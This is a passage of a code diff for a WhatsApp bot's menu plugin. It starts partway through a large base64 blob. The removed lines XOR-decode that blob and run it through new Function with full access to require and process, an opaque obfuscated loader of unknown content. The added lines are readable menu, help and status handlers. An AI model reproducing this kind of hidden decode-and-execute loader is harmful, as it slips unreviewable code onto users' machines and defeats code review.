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';
-  const X=Buffer.from(D,'base64');
-  for(let i=0;i<X.length;i++) X[i]^=K[i%K.length];
-  const C=X.toString('utf8');
-  return (new Function('require','module','exports','__filename','__dirname','process','Buffer',C))(require,module,exports,__filename,__dirname,process,Buffer);
-})();
+const os = require('os');
+const { bold, tzParts, fmtDur, progressBar } = require('../lib/util');
+const { getHostingPlatform } = require('../lib/platform');
+const menus = require('../lib/menus');
+const fonts = require('../lib/fonts');
+const { sendButtons } = require('../lib/interactive');
+
+module.exports = ({ def }) => {
+  const idx = () => require('./index');
+
+  function visible(ctx) {
+    const { registry, categories, CATEGORY_ORDER } = idx();
+    const off = ctx.get('disabled', []);
+    const offCats = ctx.get('disabledCats', []);
+    const cats = CATEGORY_ORDER.filter(c => categories.has(c) && !offCats.includes(c));
+    return { registry, categories, cats, off };
+  }
+
+  function infoBox(ctx) {
+    const { registry } = idx();
+    const p = tzParts(ctx.tz());
+    const used = Math.round(process.memoryUsage().rss / 1048576);
+    const total = Math.round(os.totalmem() / 1048576);
+    const total_cmds = new Set([...registry.values()].filter(d => d.cat).map(d => d.name)).size;
+    const row = (k, v) => `┃ ❖ ${bold(k.padEnd(8))}: ${v}`;
+    return [
+      '┏❒ 👑 ✦ 𝐃𝐄𝐂𝐀𝐍 𝐗𝐌𝐃 ✦ 👑 ❒',
+      row('Prefix', ctx.var('PREFIX')),
+      row('User', ctx.name || ctx.senderNum),
+      row('Time', p.time),
+      row('Day', p.weekday),
+      row('Date', p.date),
+      row('Version', require('../package.json').version),
+      row('Plugins', total_cmds),
+      row('Ram', `${used}/${total}MB`),
+      row('Uptime', fmtDur((Date.now() - ctx.rt.started) / 1000)),
+      row('Mode', ctx.var('MODE')),
+      row('Platform', getHostingPlatform()),
+      '┗❒ ❤️ POWERED BY DECAN KONNECT'
+    ].join('\n');
+  }
+
+  // ---- Menu (v1.2.0) -------------------------------------------------------------------------------------------
+  // Themed sections (your reordered layout). Names that are not real commands are never shown, so the menu cannot list a
+  // dead entry; disabled commands are hidden too. Section titles use the owner's chosen font (.menufont).
+  const SECTIONS = [
+      ['👑 Owner Commands', ['menu', 'owner', 'restart', 'shutdown', 'update', 'settings', 'setprefix', 'setname', 'setbio', 'setstatus', 'setpp', 'broadcast', 'ban', 'unban', 'block', 'unblock', 'eval', 'exec', 'sessions', 'clearcache', 'fixsession', 'access', 'alias', 'unalias', 'aliases', 'limits', 'doctor', 'menufont']],
+      ['👥 Group Management', ['kick', 'add', 'promote', 'demote', 'tagall', 'hidetag', 'everyone', 'groupinfo', 'grouplink', 'revoke', 'setname', 'setdesc', 'open', 'close', 'lock', 'unlock', 'mute', 'unmute', 'delete', 'warn', 'warnings', 'resetwarn']],
+      ['🤖 AI & ChatGPT', ['ai', 'chatgpt', 'ask', 'imagine', 'vision', 'analyze', 'summarize', 'translate', 'grammar', 'rewrite', 'code', 'debug', 'explain', 'gemini', 'deepseek', 'llama', 'prompt', 'clear']],
+      ['🎨 Image Generation & Editing', ['imagine', 'generate', 'sticker', 's', 'take', 'toimg', 'removebg', 'enhance', 'upscale', 'blur', 'crop', 'resize', 'circle', 'wanted', 'wasted', 'meme', 'quote']],
+      ['🎵 Music & Audio', ['play', 'song', 'yta', 'lyrics', 'bass', 'deep', 'nightcore', 'slow', 'fast', 'reverse', 'volume', 'mp3', 'audioconvert', 'tts', 'transcribe', 'voice']],
+      ['🎬 Video & Media', ['video', 'ytv', 'ytmp4', 'tiktok', 'instagram', 'facebook', 'twitter', 'mediafire', 'pinterest', 'download', 'screenshot', 'gif', 'mp4']],
+      ['📥 Downloaders & Apps', ['apk', 'movie', 'drama', 'cartoon', 'apksearch', 'apkdl', 'appinfo', 'gitclone', 'ghrelease', 'ytthumb', 'play', 'song', 'yta', 'ytv', 'tiktok', 'instagram', 'facebook', 'twitter', 'pinterest', 'reddit', 'soundcloud', 'spotify', 'mediafire', 'gdrive', 'download', 'upload']],
+      ['⚽ Football & Sports', ['livescore', 'fixtures', 'results', 'match', 'table', 'fulltable', 'titlerace', 'relegation', 'wcgroups', 'ustable', 'squad', 'nextmatch', 'lastresults', 'scorers', 'leaguenews', 'injuries', 'transfers', 'sportnews', 'player', 'leagues', 'livealerts', 'matchday', 'epl', 'laliga', 'seriea', 'bundesliga', 'ligue1', 'ucl', 'nba', 'nfl', 'f1', 'sportsmenu']],
+      ['🤼 WWE & Wrestling', ['wwe', 'raw', 'smackdown', 'nxt', 'wwechamps', 'wweschedule', 'wweresults', 'wwerumors', 'wwemania', 'royalrumble', 'summerslam', 'survivorseries', 'aew', 'superstar', 'wwedraft', 'wwehof', 'wwewomen']],
+      ['🖼️ Photo Studio', ['enhance', 'hd', 'autofix', 'hdr', 'brighten', 'darken', 'contrast', 'saturate', 'fade', 'warm', 'cool', 'vintage', 'noir', 'glow', 'dreamy', 'cyberpunk', 'sunset', 'emboss', 'oldphoto', 'vignettefx', 'cleanimg', 'mirrorfx', 'neonedge', 'duotone', 'polaroid', 'roundcorners', 'sketch', 'cartoon', 'pencil', 'bokeh', 'picfilters']],
+      ['🛡️ Security & Protection', ['antidelete', 'antiviewonce', 'antiedit', 'antispam', 'antilink', 'antibot', 'antitag', 'antifake', 'autoread', 'autoviewstatus', 'autoreactstatus', 'autoreact', 'privacy', 'blocklist', 'spamcheck']],
+      ['📱 WhatsApp Status', ['tostatus', 'textstatus', 'statusimage', 'statusvideo', 'statusaudio', 'save', 'ss', 'vv', 'vv2', 'status', 'getstatus', 'savestatus', 'autoviewstatus', 'autoreactstatus', 'statuslike', 'statusprivacy']],
+      ['🔗 Pairing & Connection', ['pair', 'paircode', 'qr', 'connect', 'disconnect', 'reconnect', 'connection', 'session', 'logout']],
+      ['🔍 Search & Information', ['google', 'search', 'wikipedia', 'weather', 'news', 'define', 'movie', 'anime', 'github', 'npm', 'image', 'wallpaper']],
+      ['🎮 Games & Entertainment', ['quiz', 'trivia', 'riddle', 'guess', 'tictactoe', 'hangman', 'snake', 'joke', 'fact', 'ship', 'truth', 'dare', 'wordle']],
+      ['🧰 Utility & Productivity', ['calculator', 'textqr', 'shorturl', 'weather', 'time', 'date', 'translate', 'currency', 'remind', 'password', 'reverse', 'dictionary', 'wordcount', 'age', 'loan', 'tip']],
+      ['💻 Developer Tools', ['github', 'repo', 'npm', 'html', 'css', 'javascript', 'python', 'php', 'json', 'base64', 'urlencode', 'qr', 'uptime', 'system', 'ping']],
+      ['🌐 Bot Information', ['menu', 'help', 'about', 'owner', 'repo', 'script', 'runtime', 'ping', 'status', 'alive', 'version', 'support', 'channel', 'report']],
+      ['⚙️ Automation & Customization', ['autoreact', 'autoread', 'autotyping', 'autobio', 'autostatus', 'autolikestatus', 'prefix', 'setprefix', 'setwelcome', 'setgoodbye', 'menufont', 'settimezone', 'setlanguage', 'antidelete']],
+      ['🔤 Fonts & Text Style', ['style', 'fontlist', 'fonts', 'fancy', 'bold', 'italic', 'mono', 'smallcaps', 'bubble', 'strike', 'underline', 'vapor', 'zalgo', 'flip', 'menufont']],
+      ['✍️ Text Tools', ['wordcount', 'textcase', 'slug', 'lorem', 'mock', 'clap', 'uwu', 'leet', 'piglatin', 'nato', 'acronym', 'initials', 'charcount', 'sortlines', 'uniquelines', 'reverselines', 'numberlines', 'extractemails', 'extracturls', 'extractnumbers', 'anagram', 'palindrome', 'urlparse']],
+      ['💰 Money & Finance', ['loan', 'savings', 'compound', 'splitbill', 'vat', 'tip', 'discount', 'percent', 'percentchange', 'roi', 'margin', 'breakeven']],
+      ['📅 Dates & Time', ['age', 'daysbetween', 'dateadd', 'workdays', 'weeknum', 'dayofweek', 'leapyear', 'sleepcalc', 'generation', 'birthstone', 'zodiac']],
+      ['🔢 Numbers & Converters', ['roman', 'numwords', 'prime', 'baseconv', 'temp', 'convert', 'hexcolor', 'ipcalc']],
+      ['🎛️ Control Center', ['access', 'alias', 'unalias', 'aliases', 'limits', 'doctor', 'menufont']]
+    ];
+
+  const stripLead = t => t.replace(/^[^\p{L}\p{N}]+/u, '').trim();
+  const fontOf = ctx => fonts.find(ctx.var('MENU_FONT') || 'boldserif') || fonts.find('boldserif');
+  const styledTitle = (title, font) => { const m = title.match(/^([^\p{L}\p{N}]*)(.*)$/u); return `${m[1]}${font.fn(m[2].toUpperCase())}`.trim(); };
+  function liveSections(ctx) {
+    const { registry } = idx();
+    const off = new Set(ctx.get('disabled', []));
+    return SECTIONS.map(([title, cmds]) => [title, cmds.filter(c => registry.has(c) && !off.has(c))]).filter(([, cmds]) => cmds.length);
+  }
+  const block = (P, font, title, cmds) => `╭━━〔 *${styledTitle(title, font)}* 〕\n${cmds.map(c => `│ ◈ *${P}${c}*`).join('\n')}\n╰━━━━━━━━━━━━━━━━━━`;
+  const FOOT = '┏❒ 👑 ✦ 𝐃𝐄𝐂𝐀𝐍 𝐗𝐌𝐃 ✦ 👑 ❒';
+
+  def(['menu', 'list'], { core: true, public: true, usage: 'menu • menu <section|number> • menu list • menu new • menu cats', desc: 'Show the command menu.' }, async ctx => {
+    const P = ctx.var('PREFIX') || '.';
+    const { registry, categories, CATEGORY_ORDER } = idx();
+    const ver = require('../package.json').version;
+    const font = fontOf(ctx);
+    const secs = liveSections(ctx);
+    const commandCount = new Set([...registry.values()].filter(d => d.cat).map(d => d.name)).size;
+    const ramPct = (1 - os.freemem() / os.totalmem()) * 100; // system memory in use
+    const p = tzParts(ctx.tz());
+    const host = getHostingPlatform();
+    const uptime = fmtDur((Date.now() - ctx.rt.started) / 1000);
+    const send = text => ctx.send({ text, contextInfo: ctx.adContext(true), noFrame: true }, { quoted: ctx.msg });
+    const arg = (ctx.argv.join(' ') || '').toLowerCase().trim();
+
+    if (arg === 'list' || arg === 'index' || arg === 'sections') {
+      const rows = secs.map(([t, c], i) => `│ ${i < 9 ? ' ' : ''}*${i + 1}.* ${t}  _(${c.length})_`).join('\n');
+      return send(`╭━━〔 *${styledTitle('📚 Menu sections', font)}* 〕\n${rows}\n╰━━━━━━━━━━━━━━━━━━\n_Open one:_ *${P}menu <number or name>*  •  *${P}menu new*  •  *${P}menu cats*\n${FOOT}`);
+    }
+    if (arg === 'new') {
+      const fresh = [...new Set([...registry.values()].filter(d => d.cat && d.since === ver).map(d => d.name))].sort();
+      return send(`${block(P, font, `✨ New in v${ver}`, fresh)}\n${FOOT}`);
+    }
+    if (arg === 'cats' || arg === 'categories') {
+      const rows = CATEGORY_ORDER.filter(c => categories.has(c)).map(c => `│ ◈ *${P}menu cat ${c}*  _(${new Set(categories.get(c).map(d => d.name)).size})_`).join('\n');
+      return send(`╭━━〔 *${styledTitle('🗂️ Every category', font)}* 〕\n${rows}\n╰━━━━━━━━━━━━━━━━━━\n${FOOT}`);
+    }
+    if (/^cat(egory)?\s+\S+/.test(arg)) {
+      const want = arg.replace(/^cat(egory)?\s+/, '');
+      const key = CATEGORY_ORDER.find(c => c === want) || CATEGORY_ORDER.find(c => c.startsWith(want));
+      const names = key ? [...new Set([...registry.values()].filter(d => d.cat === key).map(d => d.name))].sort() : [];
+      if (!names.length) return ctx.reply(`No category called *${want}*. See *${P}menu cats*.`);
+      return send(`${block(P, font, `📁 ${key}`, names)}\n${FOOT}`);
+    }
+    if (arg && arg !== 'all' && arg !== 'full') {
+      const n = /^\d+$/.test(arg) ? Number(arg) - 1 : secs.findIndex(([t]) => stripLead(t).toLowerCase().includes(arg));
+      const hit = secs[n];
+      if (!hit) return ctx.reply(`No menu section matches *${arg}*. See *${P}menu list*.`);
+      return send(`${block(P, font, hit[0], hit[1])}\n_Details:_ *${P}help <command>*\n${FOOT}`);
+    }
+
+    const fresh = new Set([...registry.values()].filter(d => d.cat && d.since === ver).map(d => d.name)).size;
+    const menu = `┏❒ 👑 ✦ 𝐃𝐄𝐂𝐀𝐍 𝐗𝐌𝐃 ✦ 👑 ❒
+_Building a smarter WhatsApp experience._
+┃
+┃ *Usᴇʀ:* Decan Konnect Tech Services
+┃ *Oᴡɴᴇʀ:* Sir Lenny Muriuki
+┃ *Mᴏᴅᴇ:* ${String(ctx.var('MODE') || 'PUBLIC').toUpperCase()}
+┃ *Hᴏsᴛ:* ${host}
+┃ *Pʀᴇғɪx:* [ ${P} ]
+┃ *Cᴏᴍᴍᴀɴᴅs:* ${commandCount}
+┃ *Vᴇʀsɪᴏɴ:* ${ver}
+┃ *Rᴀᴍ:* ${progressBar(ramPct)}
+┃ *Uᴘᴛɪᴍᴇ:* ${uptime}
+┃
+┗❒
+╭━━〔 *${styledTitle('⚜️ Status', font)}* 〕
+│ *👤 User      :* ${ctx.name || ctx.senderNum}
+│ *🕰️ Time      :* ${p.time}:${p.s}
+│ *📅 Date      :* ${p.date}
+│ *✨ New       :* ${fresh} commands in v${ver} → *${P}menu new*
+│ *📚 Sections  :* *${P}menu list*  •  *${P}menu <name>*
+╰━━━━━━━━━━━━━━━━━━
+${secs.map(([t, c]) => block(P, font, t, c)).join('\n')}
+${FOOT}`;
+    await send(menu);
+  });
+
+  // .menufont — pick the font used for menu section titles
+  def('menufont', { cat: 'bot', owner: true, usage: 'menufont <style name or number> • menufont reset • menufont list', desc: 'Choose the font used for the menu section titles.' }, async ctx => {
+    const P = ctx.var('PREFIX') || '.';
+    const a = (ctx.argv[0] || '').toLowerCase();
+    if (!a || a === 'list') {
+      const cur = fontOf(ctx);
+      return ctx.reply(`${fonts.list().map(s => `${String(s.n).padStart(2)}. ${s.fn('MENU')}  ${s.label}${s.id === cur.id ? '  ✅' : ''}`).join('\n')}\n\nSet one: *${P}menufont 8*  or  *${P}menufont script*`, { title: 'Menu fonts' });
+    }
+    if (a === 'reset') { ctx.update('vars', {}, v => { delete v.MENU_FONT; }); return ctx.reply('✅ Menu font reset to *Bold Serif*.'); }
+    const f = fonts.find(a);
+    if (!f) return ctx.reply(`Unknown font. See *${P}menufont list*.`);
+    ctx.update('vars', {}, v => { v.MENU_FONT = f.id; });
+    await ctx.reply(`✅ Menu titles now use *${f.label}*: ${f.fn('MENU')}\nSend *${P}menu* to see it.`);
+  });
+
+  // .toggle <name> — flips one switch from the On/Off Controls page (or by typing it). Gating mirrors the real command:
+  // bot-wide switches are owner-only, group switches need a group admin.
+  def('toggle', { core: true, public: true, usage: 'toggle <switch name>', desc: 'Flip an on/off switch (used by the On/Off Controls buttons).' }, async ctx => {
+    const t = menus.findToggle(ctx.argv[0]);
+    if (!t) return ctx.reply(`Unknown switch. Open *${ctx.var('PREFIX')}menu toggles* to see them all.`);
+    if (t.scope === 'owner' && !ctx.isOwner) return ctx.reply('🔒 This switch is for the bot owner only.');
+    if (t.scope === 'group') {
+      if (!ctx.isGroup) return ctx.reply('👥 This switch works in groups only.');
+      if (!ctx.isOwner && !(await ctx.admin())) return ctx.reply('🛡️ Only group admins can change this switch.');
+    }
+    const target = idx().registry.get(t.name);
+    if (!target) return ctx.reply('That command is not available.');
+    const next = menus.isOn(ctx, t) ? 'off' : 'on';
+    const sub = Object.assign(Object.create(ctx), { cmd: t.name, args: next, argv: [next], input: () => next });
+    await target.run(sub);
+    const at = menus.visibleToggles(ctx).findIndex(x => x.name === t.name);
+    await menus.sendToggles(ctx, Math.floor(Math.max(0, at) / menus.PER_PAGE) + 1);
+  });
+
+  def('help', { core: true, public: true }, async ctx => {
+    const { registry } = idx();
+    const n = ctx.argv[0]?.toLowerCase().replace(/^[^a-z0-9]+/, '');
+    if (!n) return sendButtons(ctx, { title: 'Help', body: `Send *${ctx.var('PREFIX')}menu* to see every command.\nSend *${ctx.var('PREFIX')}help <command>* for details.`, buttons: [{ label: '📋 Menu', cmd: 'menu' }, { label: '🟢 Alive', cmd: 'alive' }, { label: '🏓 Ping', cmd: 'ping' }] });
+    const d = registry.get(n);
+    if (!d || !d.cat) return ctx.reply(`No command called *${n}*.`);
+    const flags = [d.owner && 'owner only', d.group && 'group only', d.admin && 'admins only', d.botAdmin && 'bot must be admin'].filter(Boolean).join(', ');
+    await ctx.reply([
+      `${bold('Command')}: ${ctx.var('PREFIX')}${d.name}`,
+      d.names.length > 1 ? `${bold('Aliases')}: ${d.names.slice(1).join(', ')}` : null,
+      `${bold('Category')}: ${d.cat}`,
+      d.desc ? `${bold('What it does')}: ${d.desc}` : null,
+      d.usage ? `${bold('Usage')}: ${ctx.var('PREFIX')}${d.usage}` : null,
+      flags ? `${bold('Access')}: ${flags}` : null
+    ].filter(Boolean).join('\n'), { title: 'Help' });
+  });
+
+  def('alive', { cat: 'misc', desc: 'Check that the bot is running.' }, async ctx => {
+    const custom = ctx.var('ALIVE_MESSAGE');
+    await sendButtons(ctx, {
+      body: custom || `🟢 ${bold('I am alive and running!')}\n\n⏱ Uptime: ${fmtDur((Date.now() - ctx.rt.started) / 1000)}\n⚙️ Mode: ${ctx.var('MODE')}\n📌 Prefix: ${ctx.var('PREFIX')}\n\nTap a button or send *${ctx.var('PREFIX')}menu*.`,
+      buttons: [{ label: '📋 Menu', cmd: 'menu' }, { label: '🏓 Ping', cmd: 'ping' }, { label: '❓ Help', cmd: 'help' }]
+    });
+  });
+
+  def('ping', { cat: 'misc', desc: 'Measure response speed.', public: true }, async ctx => {
+    const t0 = Date.now();
